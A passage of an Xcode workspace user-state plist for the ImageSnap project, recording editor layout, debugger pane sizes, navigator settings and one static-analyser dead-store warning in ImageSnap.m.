				<dict>
					<key>CF$UID</key>
					<integer>63</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>64</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>95</integer>
				</dict>
			</array>
		</dict>
		<string>EditorLayout_StateSavingStateDictionaries</string>
		<string>EditorLayout_Selected</string>
		<string>EditorLayout_Geometry</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>65</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>66</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>67</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>68</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>69</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>70</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>71</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>72</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>73</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>74</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>80</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>40</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>40</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>90</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>91</integer>
				</dict>
			</array>
		</dict>
		<string>FileDataType</string>
		<string>ArchivableRepresentation</string>
		<string>EditorState</string>
		<string>NavigableItemName</string>
		<string>DocumentNavigableItemName</string>
		<string>DocumentExtensionIdentifier</string>
		<string>DocumentURL</string>
		<string>public.objective-c-source</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>51</integer>
			</dict>
			<key>DocumentLocation</key>
			<dict>
				<key>CF$UID</key>
				<integer>47</integer>
			</dict>
			<key>DomainIdentifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>37</integer>
			</dict>
			<key>IdentifierPath</key>
			<dict>
				<key>CF$UID</key>
				<integer>75</integer>
			</dict>
			<key>IndexOfDocumentIdentifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>46</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>76</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>77</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>78</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>40</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>43</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>41</integer>
			</dict>
			<key>Identifier</key>
			<dict>
				<key>CF$UID</key>
				<integer>79</integer>
			</dict>
		</dict>
		<string>ImageSnap</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>81</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>82</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>83</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>84</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>85</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>86</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>88</integer>
				</dict>
			</array>
		</dict>
		<string>PrimaryDocumentTimestamp</string>
		<string>PrimaryDocumentVisibleCharacterRange</string>
		<string>HideAllIssues</string>
		<string>PrimaryDocumentSelectedCharacterRange</string>
		<real>335465254.95356703</real>
		<string>{18622, 1553}</string>
		<false/>
		<string>{19264, 0}</string>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSDictionary</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSDictionary</string>
		</dict>
		<string>Xcode.IDEKit.EditorDocument.SourceCode</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>92</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.m</string>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSURL</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSURL</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSMutableDictionary</string>
				<string>NSDictionary</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSMutableDictionary</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>96</integer>
				</dict>
			</array>
		</dict>
		<string>{{0, 0}, {1129, 581}}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>98</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>99</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>100</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>101</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>102</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>103</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>105</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>107</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>111</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>123</integer>
				</dict>
			</array>
		</dict>
		<string>LayoutFocusMode</string>
		<string>console</string>
		<string>variables</string>
		<string>LayoutMode</string>
		<string>IDEDebugArea_SplitView</string>
		<string>IDEDebuggerAreaSplitView</string>
		<integer>1</integer>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>106</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
			</array>
		</dict>
		<string>ConsoleFilterMode</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>108</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>109</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>110</integer>
				</dict>
			</array>
		</dict>
		<string>VariablesViewSelectedScope</string>
		<string>DBGVariablesViewFilterMode</string>
		<integer>2</integer>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>113</integer>
				</dict>
			</array>
		</dict>
		<string>DVTSplitViewItems</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>114</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>119</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>117</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>118</integer>
				</dict>
			</array>
		</dict>
		<string>DVTIdentifier</string>
		<string>DVTViewMagnitude</string>
		<string>VariablesView</string>
		<real>298</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>120</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>121</integer>
				</dict>
			</array>
		</dict>
		<string>ConsoleArea</string>
		<real>830</real>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSMutableArray</string>
				<string>NSArray</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSMutableArray</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>124</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>125</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>127</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>117</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>126</integer>
				</dict>
			</array>
		</dict>
		<real>298</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>120</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>128</integer>
				</dict>
			</array>
		</dict>
		<real>830</real>
		<true/>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>131</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>132</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>135</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>133</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>134</integer>
				</dict>
			</array>
		</dict>
		<string>IDEEditor</string>
		<real>603</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>136</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>137</integer>
				</dict>
			</array>
		</dict>
		<string>IDEDebuggerArea</string>
		<real>199</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array/>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>140</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>141</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>144</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>142</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>143</integer>
				</dict>
			</array>
		</dict>
		<string></string>
		<real>578</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>142</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>145</integer>
				</dict>
			</array>
		</dict>
		<real>224</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>147</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>148</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>149</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>150</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>147</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>169</integer>
				</dict>
			</array>
		</dict>
		<string>Xcode.IDEKit.Navigator.Structure</string>
		<string>SelectedNavigator</string>
		<string>Xcode.IDEKit.Navigator.Issues</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>151</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>152</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>153</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>154</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>155</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>156</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>157</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>158</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>159</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>161</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>164</integer>
				</dict>
			</array>
		</dict>
		<string>IDEVisibleRect</string>
		<string>IDEUnsavedDocumentFilteringEnabled</string>
		<string>IDENavigatorExpandedItemsBeforeFilteringSet</string>
		<string>IDERecentDocumentFilteringEnabled</string>
		<string>IDESCMStatusFilteringEnabled</string>
		<string>IDESelectedObjects</string>
		<string>IDEExpandedItemsSet</string>
		<string>{{0, 0}, {259, 758}}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>160</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSSet</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSSet</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>162</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>163</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>43</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>40</integer>
				</dict>
			</array>
		</dict>
		<string>ImageSnap</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>160</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>165</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>167</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>168</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>163</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>166</integer>
				</dict>
			</array>
		</dict>
		<string>Products</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>163</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>163</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>43</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>170</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>171</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>172</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>173</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>174</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>175</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>176</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>177</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>178</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>179</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>180</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>182</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>207</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>208</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>209</integer>
				</dict>
			</array>
		</dict>
		<string>IDEErrorFilteringEnabled</string>
		<string>IDEVisibleRect</string>
		<string>IDECollapsedFiles</string>
		<string>IDEExpandedIssues</string>
		<string>IDESelectedNavigables</string>
		<string>IDEShowsByType</string>
		<string>IDECollapsedTypes</string>
		<string>IDERecentFilteringEnabled</string>
		<string>IDECollapsedGroups</string>
		<string>{{0, 0}, {259, 736}}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>181</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSMutableSet</string>
				<string>NSSet</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSMutableSet</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>181</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>183</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>184</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>185</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>186</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>187</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>188</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>189</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>196</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>204</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>206</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>204</integer>
				</dict>
			</array>
		</dict>
		<string>documentLocations</string>
		<string>subissues</string>
		<string>shortMessage</string>
		<string>type</string>
		<string>fullMessage</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>190</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>194</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>193</integer>
			</dict>
			<key>characterRangeLen</key>
			<integer>0</integer>
			<key>characterRangeLoc</key>
			<integer>-1</integer>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>191</integer>
			</dict>
			<key>endingColumnNumber</key>
			<integer>28</integer>
			<key>endingLineNumber</key>
			<integer>539</integer>
			<key>startingColumnNumber</key>
			<integer>28</integer>
			<key>startingLineNumber</key>
			<integer>539</integer>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>192</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.m</string>
		<real>0.0</real>
		<dict>
			<key>$classes</key>
			<array>
				<string>DVTTextDocumentLocation</string>
				<string>DVTDocumentLocation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>DVTTextDocumentLocation</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>193</integer>
			</dict>
			<key>characterRangeLen</key>
			<integer>0</integer>
			<key>characterRangeLoc</key>
			<integer>-1</integer>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>191</integer>
			</dict>
			<key>endingColumnNumber</key>
			<integer>123</integer>
			<key>endingLineNumber</key>
			<integer>539</integer>
			<key>startingColumnNumber</key>
			<integer>40</integer>
			<key>startingLineNumber</key>
			<integer>539</integer>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>195</integer>
			</dict>
		</dict>
		<real>0.0</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>197</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>184</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>185</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>186</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>187</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>188</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>198</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>203</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>204</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>205</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>204</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>199</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>201</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>193</integer>
			</dict>
			<key>characterRangeLen</key>
			<integer>0</integer>
			<key>characterRangeLoc</key>
			<integer>-1</integer>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>191</integer>
			</dict>
			<key>endingColumnNumber</key>
			<integer>28</integer>
			<key>endingLineNumber</key>
			<integer>539</integer>
			<key>startingColumnNumber</key>
			<integer>28</integer>
			<key>startingLineNumber</key>
			<integer>539</integer>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>200</integer>
			</dict>
		</dict>
		<real>0.0</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>193</integer>
			</dict>
			<key>characterRangeLen</key>
			<integer>0</integer>
			<key>characterRangeLoc</key>
			<integer>-1</integer>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>191</integer>
			</dict>
			<key>endingColumnNumber</key>
			<integer>123</integer>
			<key>endingLineNumber</key>
			<integer>539</integer>
			<key>startingColumnNumber</key>
			<integer>40</integer>
			<key>startingLineNumber</key>
			<integer>539</integer>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>202</integer>
			</dict>
		</dict>
		<real>0.0</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<string>Value stored to 'timelapse' is never read</string>
		<string>Uncategorized</string>
		<string>Dead store</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>181</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>181</integer>
			</dict>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>211</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>212</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>214</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>216</integer>
				</dict>
